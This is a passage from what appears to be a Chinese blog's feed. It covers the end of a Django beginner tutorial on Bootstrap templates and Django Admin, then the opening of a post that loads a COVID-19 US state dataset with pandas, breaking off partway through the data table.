<span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">    &#123;% for board in boards %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                &#123;&#123; board.name &#125;&#125;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">small</span> <span class="attr">style</span>=<span class="string">"color: #888"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先，我们在模板的开头使用了 Static Files App 模板标签 <code>{% load static %}</code>。</p><p>模板标签<code>{% static %}</code>用于构成资源文件完整URL。在这种情况下，<code>{% static 'css/bootstrap.min.css' %}</code>将返回 <strong>/static/css/bootstrap.min.css</strong>，它相当于 <code>http://127.0.0.1:8000/static/css/bootstrap.min.css</code>。</p><p><code>{% static %}</code>模板标签使用 <strong>settings.py</strong>文件中的 <code>STATIC_URL</code> 配置来组成最终的URL，例如，如果您将静态文件托管在像 <code>https://static.example.com/</code> 这样的子域中 ，那么我们将设置 <code>STATIC_URL=https://static.example.com/</code>，然后 <code>{% static 'css/bootstrap.min.css' %}</code>返回的是 <code>https://static.example.com/css/bootstrap.min.css</code></p><p>但凡是需要引用CSS，JavaScript或图片文件的地方就使用<code>{% static %}</code>。稍后，当我们开始部署项目到正式环境时，我们将讨论更多。现在都设置好了。</p><p>刷新页面 <a href="http://127.0.0.1:8000" target="_blank" rel="noopener">http://127.0.0.1:8000</a> ，我们可以看到它可以正常运行：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django05.png" alt=""></p><p>现在我们可以编辑模板，以利用Bootstrap CSS：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static %&#125;<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/bootstrap.min.css' %&#125;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ol</span> <span class="attr">class</span>=<span class="string">"breadcrumb my-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"breadcrumb-item active"</span>&gt;</span>Boards<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span> <span class="attr">class</span>=<span class="string">"thead-dark"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Board<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Posts<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Topics<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>Last Post<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">          &#123;% for board in boards %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                &#123;&#123; board.name &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">"text-muted d-block"</span>&gt;</span>&#123;&#123; board.description &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">"align-middle"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示效果：<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django06.png" alt=""></p><p>到目前为止，我们使用交互式控制台（python manage.py shell）添加了几个新的版块。但我们需要一个更好的方式来实现。接下来，我们将为网站管理员实现一个管理界面来管理这些数据。</p><h2 id="Django-Admin介绍"><a href="#Django-Admin介绍" class="headerlink" title="Django Admin介绍"></a>Django Admin介绍</h2><p>当我们开始一个新项目时，Django已经配置了<strong>Django Admin</strong>，这个应用程序列出的<code>INSTALLED_APPS</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426django0018.png" alt=""></p><p>使用 Django Admin的一个很好的例子就是用在博客中; 它可以被作者用来编写和发布文章。另一个例子是电子商务网站，工作人员可以创建，编辑，删除产品。</p><p>现在，我们将配置 Django Admin 来维护我们应用程序的版块。</p><p>我们首先创建一个管理员帐户：</p><p><code>python manage.py createsuperuser</code></p><p>按照说明操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username (leave blank to use &#39;vitorfs&#39;): admin</span><br><span class="line">Email address: admin@example.com</span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br></pre></td></tr></table></figure><p>在浏览器中打开该URL：<code>http://127.0.0.1:8000/admin/</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django07.png" alt=""></p><p>输入用户名和密码登录到管理界面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django08.png" alt=""></p><p>它已经配置了一些功能。在这里，我们可以添加用户和组的权限管理，这些概念在后面我们将探讨更多。</p><p>添加Board模型非常简单。打开boards目录中的admin.py文件，并添加以下代码：</p><p><strong>boards/admin.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Board</span><br><span class="line"></span><br><span class="line">admin.site.register(Board)</span><br></pre></td></tr></table></figure><p>保存admin.py文件，然后刷新网页浏览器中的页面：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django09.png" alt=""></p><p>对！它已准备好被使用了。点击Boards链接查看现有版块列表：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django10.png" alt=""></p><p>我们可以通过点击 Add Board 按钮添加一个新的版块：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django11.png" alt=""></p><p>点击保存按钮：</p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django12.png" alt=""></p><p>我们可以检查一切是否正常，打开URL <code>http://127.0.0.1:8000</code></p><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/40426django13.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本教程中，我们探讨学习了许多新概念。我们为项目定义了一些需求，创建了第一个模型，迁移了数据库，开始玩 Models API。我们创建了第一个视图并编写了一些单元测试。同时我们还配置了Django模板引擎，静态文件，并将Bootstrap 4库添加到项目中。最后，我们简要介绍了Django Admin界面。</p><p>这是学习的基础部分！下一部分，将学习探索Django的URL路由，表单API，可重用模板以及更多测试。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://simpleisbetterthancomplex.com/series/2017/09/11/a-complete-beginners-guide-to-django-part-2.html#figure-4" target="_blank" rel="noopener">https://simpleisbetterthancomplex.com/series/2017/09/11/a-complete-beginners-guide-to-django-part-2.html#figure-4</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Web框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Web框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【数据集分析】新冠肺炎COVID-19数据集简单分析与处理</title>
      <link href="2020/04/26/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8ECOVID-19%20State%20Data%20Set%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86/"/>
      <url>2020/04/26/%E6%96%B0%E5%86%A0%E8%82%BA%E7%82%8ECOVID-19%20State%20Data%20Set%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>本文主要是：新冠肺炎COVID-19 State Data Set的简单分析与处理</p><a id="more"></a><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>Use Pandas to load COVID-19 State Data Set as the dataframe.<br><strong><a href="https://pandas.pydata.org/" target="_blank" rel="noopener">Pandas</a></strong>  </p><p>由于数据持续更新,所以下载链接仅供参考，链接：<a href="https://pan.baidu.com/s/1npzHaEX5DUudB1yTTm8hyQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1npzHaEX5DUudB1yTTm8hyQ</a><br>提取码：qy8i</p><p>若需要请到此，下载最新数据<strong><a href="https://www.kaggle.com/nightranger77/covid19-state-data/data" target="_blank" rel="noopener">COVID-19 State Data Set</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">'COVID19_state.csv'</span>)</span><br><span class="line">df = pd.DataFrame(data)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>State</th>      <th>Tested</th>      <th>Infected</th>      <th>Deaths</th>      <th>Population</th>      <th>Pop Density</th>      <th>Gini</th>      <th>ICU Beds</th>      <th>Income</th>      <th>GDP</th>      <th>...</th>      <th>Hospitals</th>      <th>Health Spending</th>      <th>Pollution</th>      <th>Med-Large Airports</th>      <th>Temperature</th>      <th>Urban</th>      <th>Age 0-25</th>      <th>Age 26-54</th>      <th>Age 55+</th>      <th>School Closure Date</th>    </tr>  </thead>  <tbody>    <tr>      <td>0</td>      <td>Alaska</td>      <td>9655</td>      <td>314</td>      <td>9</td>      <td>734002</td>      <td>1.2863</td>      <td>0.4081</td>      <td>119</td>      <td>59687</td>      <td>73205</td>      <td>...</td>      <td>21</td>      <td>11064</td>      <td>6.4</td>      <td>1.0</td>      <td>26.60</td>      <td>66.0</td>      <td>0.36</td>      <td>0.39</td>      <td>0.25</td>      <td>03/19/20</td>    </tr>    <tr>      <td>1</td>      <td>Alabama</td>      <td>42538</td>      <td>4723</td>      <td>151</td>      <td>4908621</td>      <td>96.9221</td>      <td>0.4847</td>      <td>1533</td>      <td>42334</td>      <td>45219</td>      <td>...</td>      <td>101</td>      <td>7281</td>      <td>8.1</td>      <td>1.0</td>      <td>62.80</td>      <td>59.0</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>2</td>      <td>Arkansas</td>      <td>24141</td>      <td>1739</td>      <td>38</td>      <td>3038999</td>      <td>58.4030</td>      <td>0.4719</td>      <td>732</td>      <td>42566</td>      <td>42454</td>      <td>...</td>      <td>88</td>      <td>7408</td>      <td>7.1</td>      <td>0.0</td>      <td>60.40</td>      <td>56.2</td>      <td>0.34</td>      <td>0.37</td>      <td>0.30</td>      <td>03/17/20</td>    </tr>    <tr>      <td>3</td>      <td>Arizona</td>      <td>51045</td>      <td>4719</td>      <td>177</td>      <td>7378494</td>      <td>64.9550</td>      <td>0.4713</td>      <td>1559</td>      <td>43650</td>      <td>48055</td>      <td>...</td>      <td>83</td>      <td>6452</td>      <td>9.7</td>      <td>1.0</td>      <td>60.30</td>      <td>89.8</td>      <td>0.33</td>      <td>0.36</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>4</td>      <td>California</td>      <td>266900</td>      <td>28963</td>      <td>1072</td>      <td>39937489</td>      <td>256.3727</td>      <td>0.4899</td>      <td>7338</td>      <td>62586</td>      <td>74205</td>      <td>...</td>      <td>359</td>      <td>7549</td>      <td>12.8</td>      <td>9.0</td>      <td>59.40</td>      <td>95.0</td>      <td>0.33</td>      <td>0.40</td>      <td>0.26</td>      <td>03/19/20</td>    </tr>    <tr>      <td>5</td>      <td>Colorado</td>      <td>44606</td>      <td>9433</td>      <td>411</td>      <td>5845526</td>      <td>56.4011</td>      <td>0.4586</td>      <td>1597</td>      <td>56846</td>      <td>63882</td>      <td>...</td>      <td>89</td>      <td>6804</td>      <td>6.7</td>      <td>1.0</td>      <td>45.10</td>      <td>86.2</td>      <td>0.33</td>      <td>0.40</td>      <td>0.27</td>      <td>03/23/20</td>    </tr>    <tr>      <td>6</td>      <td>Connecticut</td>      <td>58213</td>      <td>17550</td>      <td>1086</td>      <td>3563077</td>      <td>735.8689</td>      <td>0.4945</td>      <td>674</td>      <td>74561</td>      <td>76342</td>      <td>...</td>      <td>32</td>      <td>9859</td>      <td>7.2</td>      <td>1.0</td>      <td>49.00</td>      <td>88.0</td>      <td>0.30</td>      <td>0.38</td>      <td>0.32</td>      <td>03/17/20</td>    </tr>    <tr>      <td>7</td>      <td>District of Columbia</td>      <td>13268</td>      <td>2666</td>      <td>91</td>      <td>720687</td>      <td>11814.5410</td>      <td>0.5420</td>      <td>314</td>      <td>47285</td>      <td>200277</td>      <td>...</td>      <td>10</td>      <td>11944</td>      <td>9.8</td>      <td>0.0</td>      <td>54.65</td>      <td>100.0</td>      <td>0.30</td>      <td>0.48</td>      <td>0.22</td>      <td>03/16/20</td>    </tr>    <tr>      <td>8</td>      <td>Delaware</td>      <td>14794</td>      <td>2538</td>      <td>67</td>      <td>982895</td>      <td>504.3073</td>      <td>0.4522</td>      <td>186</td>      <td>51449</td>      <td>77253</td>      <td>...</td>      <td>7</td>      <td>10254</td>      <td>8.3</td>      <td>0.0</td>      <td>55.30</td>      <td>83.3</td>      <td>0.30</td>      <td>0.37</td>      <td>0.33</td>      <td>03/16/20</td>    </tr>    <tr>      <td>9</td>      <td>Florida</td>      <td>253183</td>      <td>25492</td>      <td>748</td>      <td>21992985</td>      <td>410.1256</td>      <td>0.4852</td>      <td>5604</td>      <td>49417</td>      <td>48318</td>      <td>...</td>      <td>217</td>      <td>8076</td>      <td>7.4</td>      <td>7.0</td>      <td>70.70</td>      <td>91.2</td>      <td>0.29</td>      <td>0.37</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>10</td>      <td>Georgia</td>      <td>74208</td>      <td>17841</td>      <td>677</td>      <td>10736059</td>      <td>186.6719</td>      <td>0.4813</td>      <td>2508</td>      <td>45745</td>      <td>55832</td>      <td>...</td>      <td>145</td>      <td>6587</td>      <td>8.3</td>      <td>1.0</td>      <td>63.50</td>      <td>75.1</td>      <td>0.35</td>      <td>0.39</td>      <td>0.26</td>      <td>03/18/20</td>    </tr>    <tr>      <td>11</td>      <td>Hawaii</td>      <td>23215</td>      <td>574</td>      <td>9</td>      <td>1412687</td>      <td>219.9419</td>      <td>0.4420</td>      <td>201</td>      <td>54565</td>      <td>64096</td>      <td>...</td>      <td>22</td>      <td>7299</td>      <td>5.4</td>      <td>2.0</td>      <td>70.00</td>      <td>91.9</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/23/20</td>    </tr>    <tr>      <td>12</td>      <td>Iowa</td>      <td>22947</td>      <td>2513</td>      <td>74</td>      <td>3179849</td>      <td>56.9284</td>      <td>0.4451</td>      <td>545</td>      <td>48823</td>      <td>59977</td>      <td>...</td>      <td>118</td>      <td>8200</td>      <td>7.1</td>      <td>0.0</td>      <td>47.80</td>      <td>64.0</td>      <td>0.34</td>      <td>0.36</td>      <td>0.30</td>      <td>NaN</td>    </tr>    <tr>      <td>13</td>      <td>Idaho</td>      <td>16869</td>      <td>1668</td>      <td>44</td>      <td>1826156</td>      <td>22.0969</td>      <td>0.4503</td>      <td>314</td>      <td>43155</td>      <td>43430</td>      <td>...</td>      <td>45</td>      <td>6927</td>      <td>6.8</td>      <td>0.0</td>      <td>44.40</td>      <td>70.6</td>      <td>0.36</td>      <td>0.36</td>      <td>0.28</td>      <td>03/23/20</td>    </tr>    <tr>      <td>14</td>      <td>Illinois</td>      <td>137404</td>      <td>29160</td>      <td>1259</td>      <td>12659682</td>      <td>228.0243</td>      <td>0.4810</td>      <td>3144</td>      <td>56933</td>      <td>67268</td>      <td>...</td>      <td>187</td>      <td>8262</td>      <td>9.3</td>      <td>2.0</td>      <td>51.80</td>      <td>88.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.28</td>      <td>03/17/20</td>    </tr>    <tr>      <td>15</td>      <td>Indiana</td>      <td>56873</td>      <td>10641</td>      <td>545</td>      <td>6745354</td>      <td>188.2810</td>      <td>0.4527</td>      <td>1861</td>      <td>46646</td>      <td>55172</td>      <td>...</td>      <td>132</td>      <td>8300</td>      <td>8.4</td>      <td>1.0</td>      <td>51.70</td>      <td>72.4</td>      <td>0.34</td>      <td>0.37</td>      <td>0.29</td>      <td>03/19/20</td>    </tr>    <tr>      <td>16</td>      <td>Kansas</td>      <td>17676</td>      <td>1790</td>      <td>86</td>      <td>2910357</td>      <td>35.5968</td>      <td>0.4550</td>      <td>767</td>      <td>50155</td>      <td>56334</td>      <td>...</td>      <td>139</td>      <td>7651</td>      <td>7.0</td>      <td>0.0</td>      <td>54.30</td>      <td>74.2</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/18/20</td>    </tr>    <tr>      <td>17</td>      <td>Kentucky</td>      <td>32225</td>      <td>2707</td>      <td>144</td>      <td>4499692</td>      <td>113.9566</td>      <td>0.4813</td>      <td>1392</td>      <td>41779</td>      <td>46898</td>      <td>...</td>      <td>105</td>      <td>8004</td>      <td>8.1</td>      <td>1.0</td>      <td>55.60</td>      <td>58.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>18</td>      <td>Louisiana</td>      <td>137999</td>      <td>23580</td>      <td>1267</td>      <td>4645184</td>      <td>107.5175</td>      <td>0.4990</td>      <td>1289</td>      <td>45542</td>      <td>53589</td>      <td>...</td>      <td>158</td>      <td>7815</td>      <td>7.9</td>      <td>1.0</td>      <td>66.40</td>      <td>73.2</td>      <td>0.34</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>19</td>      <td>Massachusetts</td>      <td>156806</td>      <td>36372</td>      <td>1560</td>      <td>6976597</td>      <td>894.4355</td>      <td>0.4786</td>      <td>1326</td>      <td>70073</td>      <td>82480</td>      <td>...</td>      <td>75</td>      <td>10559</td>      <td>6.3</td>      <td>1.0</td>      <td>47.90</td>      <td>92.0</td>      <td>0.30</td>      <td>0.39</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>20</td>      <td>Maryland</td>      <td>65370</td>      <td>12308</td>      <td>463</td>      <td>6083116</td>      <td>626.6731</td>      <td>0.4499</td>      <td>1134</td>      <td>62914</td>      <td>68573</td>      <td>...</td>      <td>50</td>      <td>8602</td>      <td>7.7</td>      <td>1.0</td>      <td>54.20</td>      <td>87.2</td>      <td>0.31</td>      <td>0.39</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>21</td>      <td>Maine</td>      <td>4241</td>      <td>847</td>      <td>32</td>      <td>1345790</td>      <td>43.6336</td>      <td>0.4519</td>      <td>256</td>      <td>48241</td>      <td>47969</td>      <td>...</td>      <td>34</td>      <td>9531</td>      <td>5.9</td>      <td>0.0</td>      <td>41.00</td>      <td>38.7</td>      <td>0.26</td>      <td>0.37</td>      <td>0.37</td>      <td>NaN</td>    </tr>    <tr>      <td>22</td>      <td>Michigan</td>      <td>107791</td>      <td>30791</td>      <td>2308</td>      <td>10045029</td>      <td>177.6655</td>      <td>0.4695</td>      <td>2423</td>      <td>47582</td>      <td>53209</td>      <td>...</td>      <td>144</td>      <td>8055</td>      <td>8.0</td>      <td>1.0</td>      <td>44.40</td>      <td>74.6</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>23</td>      <td>Minnesota</td>      <td>44368</td>      <td>2213</td>      <td>121</td>      <td>5700671</td>      <td>71.5922</td>      <td>0.4496</td>      <td>1171</td>      <td>56374</td>      <td>64675</td>      <td>...</td>      <td>127</td>      <td>8871</td>      <td>6.6</td>      <td>1.0</td>      <td>41.20</td>      <td>73.3</td>      <td>0.32</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>24</td>      <td>Missouri</td>      <td>53525</td>      <td>5517</td>      <td>175</td>      <td>6169270</td>      <td>89.7453</td>      <td>0.4646</td>      <td>1888</td>      <td>46635</td>      <td>51699</td>      <td>...</td>      <td>122</td>      <td>8107</td>      <td>7.5</td>      <td>2.0</td>      <td>54.60</td>      <td>70.4</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/19/20</td>    </tr>    <tr>      <td>25</td>      <td>Mississippi</td>      <td>37733</td>      <td>3974</td>      <td>152</td>      <td>2989260</td>      <td>63.7056</td>      <td>0.4828</td>      <td>824</td>      <td>37994</td>      <td>37948</td>      <td>...</td>      <td>99</td>      <td>7646</td>      <td>7.7</td>      <td>0.0</td>      <td>63.40</td>      <td>49.4</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>26</td>      <td>Montana</td>      <td>10569</td>      <td>426</td>      <td>10</td>      <td>1086759</td>      <td>7.4668</td>      <td>0.4667</td>      <td>165</td>      <td>47120</td>      <td>46609</td>      <td>...</td>      <td>56</td>      <td>8221</td>      <td>6.6</td>      <td>0.0</td>      <td>42.70</td>      <td>55.9</td>      <td>0.31</td>      <td>0.35</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>27</td>      <td>North Carolina</td>      <td>76211</td>      <td>6140</td>      <td>164</td>      <td>10611862</td>      <td>218.2702</td>      <td>0.4780</td>      <td>2227</td>      <td>45834</td>      <td>54441</td>      <td>...</td>      <td>112</td>      <td>7264</td>      <td>7.2</td>      <td>2.0</td>      <td>59.00</td>      <td>66.1</td>      <td>0.32</td>      <td>0.38</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>28</td>      <td>North Dakota</td>      <td>12963</td>      <td>528</td>      <td>9</td>      <td>761723</td>      <td>11.0393</td>      <td>0.4533</td>      <td>238</td>      <td>54306</td>      <td>72597</td>      <td>...</td>      <td>39</td>      <td>9851</td>      <td>4.6</td>      <td>0.0</td>      <td>40.40</td>      <td>59.9</td>      <td>0.35</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>29</td>      <td>Nebraska</td>      <td>13753</td>      <td>1138</td>      <td>24</td>      <td>1952570</td>      <td>25.4161</td>      <td>0.4477</td>      <td>440</td>      <td>52110</td>      <td>63942</td>      <td>...</td>      <td>93</td>      <td>8412</td>      <td>7.1</td>      <td>1.0</td>      <td>48.80</td>      <td>73.1</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>NaN</td>    </tr>    <tr>      <td>30</td>      <td>New Hampshire</td>      <td>13424</td>      <td>1342</td>      <td>38</td>      <td>1371246</td>      <td>153.1605</td>      <td>0.4304</td>      <td>242</td>      <td>61405</td>      <td>63067</td>      <td>...</td>      <td>28</td>      <td>9589</td>      <td>4.4</td>      <td>0.0</td>      <td>43.80</td>      <td>60.3</td>      <td>0.28</td>      <td>0.37</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>31</td>      <td>New Jersey</td>      <td>162536</td>      <td>81420</td>      <td>4070</td>      <td>8936574</td>      